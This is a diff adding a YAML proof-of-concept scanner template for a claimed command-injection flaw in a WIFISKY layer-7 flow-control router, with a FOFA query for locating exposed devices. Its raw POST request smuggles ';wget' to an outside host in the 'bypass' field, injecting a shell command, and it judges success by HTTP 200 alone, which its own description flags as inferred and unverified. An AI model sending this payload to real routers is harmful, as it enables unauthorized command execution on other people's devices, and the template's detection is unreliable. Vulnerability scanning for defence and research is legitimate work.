@@ -1,0 +1,30 @@
+id: poc-5d6a39363e2cdd3c70af
+info:
+  name: WIFISKY7层流控路由器index存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/5d6a39363e2cdd3c70af9d09fcdb71b2
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 5d6a39363e2cdd3c70af9d09fcdb71b2
+    fofa: + fofa`title="WIFISKY 7层流控路由器"`
+http:
+- raw:
+  - 'POST /portal/ibilling/index.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+
+
+    {"type":5,"version":2,"bypass":";wget guzyybmley.dgrh3.cn"}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
